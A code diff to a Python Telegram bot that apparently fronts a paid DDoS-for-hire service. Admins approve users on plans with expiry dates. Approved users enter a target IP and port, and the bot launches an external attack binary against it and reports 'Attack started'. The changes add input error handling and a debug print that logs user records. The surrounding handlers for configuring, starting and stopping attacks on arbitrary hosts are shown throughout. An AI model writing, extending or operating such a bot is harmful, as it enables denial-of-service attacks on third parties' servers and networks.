@@ -35,7 +35,10 @@ def is_valid_port(port):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_data = users_collection.find_one({"user_id": user_id})
-
+    
+    # Debug print to check user data
+    print(f"User data for {user_id}: {user_data}")
+    
     if user_data is None or user_data.get("expiration_date") < datetime.now():
         await update.message.reply_text("You are not authorized to use this bot.")
         return
@@ -46,25 +49,29 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # Handle approval command
 async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = int(context.args[0])
-    plan_value = int(context.args[1])  # Expecting 100 or 200
-    days = int(context.args[2])
-    
     if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("You are not authorized to approve users.")
         return
 
-    if plan_value not in [100, 200]:
-        await update.message.reply_text("Invalid plan. Please use 100 or 200.")
-        return
+    try:
+        user_id = int(context.args[0])
+        plan_value = int(context.args[1])  # Expecting 100 or 200
+        days = int(context.args[2])
 
-    expiration_date = datetime.now() + timedelta(days=days)
-    users_collection.update_one(
-        {"user_id": user_id}, 
-        {"$set": {"plan": plan_value, "expiration_date": expiration_date}}, 
-        upsert=True
-    )
-    await update.message.reply_text(f"User {user_id} has been approved with plan {plan_value} for {days} days.")
+        if plan_value not in [100, 200]:
+            await update.message.reply_text("Invalid plan. Please use 100 or 200.")
+            return
+
+        expiration_date = datetime.now() + timedelta(days=days)
+        users_collection.update_one(
+            {"user_id": user_id}, 
+            {"$set": {"plan": plan_value, "expiration_date": expiration_date}}, 
+            upsert=True
+        )
+        await update.message.reply_text(f"User {user_id} has been approved with plan {plan_value} for {days} days.")
+    
+    except (IndexError, ValueError):
+        await update.message.reply_text("Usage: /approve <user_id> <plan_value> <days>")
 
 # Handle button clicks
 async def attack_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -80,13 +87,12 @@ async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("You are not authorized to use this bot.")
         return
 
-    # Trim whitespace from the input
     input_text = update.message.text.strip()
 
     try:
         target, port = input_text.split()
-        target_ip = target.strip()  # Trim whitespace from IP
-        target_port = int(port.strip())  # Trim whitespace from port
+        target_ip = target.strip()
+        target_port = int(port.strip())
 
         if not is_valid_ip(target_ip):
             await update.message.reply_text("Invalid IP address. Please enter a valid IP.")
@@ -110,7 +116,6 @@ async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Start the attack
 async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global process, target_ip, target_port
-    user_id = update.effective_user.id
 
     if target_ip is None or target_port is None:
         await update.message.reply_text("Please configure the target and port first.")
@@ -124,12 +129,10 @@ async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Run the binary with target and port
         process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         
-        # Respond with a clean message
         await update.message.reply_text(f"🚀 Attack started on {target_ip}:{target_port}.")
     except Exception as e:
         await update.message.reply_text(f"❌ Error starting attack: {e}")
 
-# Stop the attack
 # Stop the attack
 async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global process
@@ -164,7 +167,7 @@ def main():
     # Register command handler for /start
     application.add_handler(CommandHandler("start", start))
 
-    # Register command handlers for user approval/disapproval
+    # Register command handlers for user approval
     application.add_handler(CommandHandler("approve", approve_user))
 
     # Register button handler for Attack
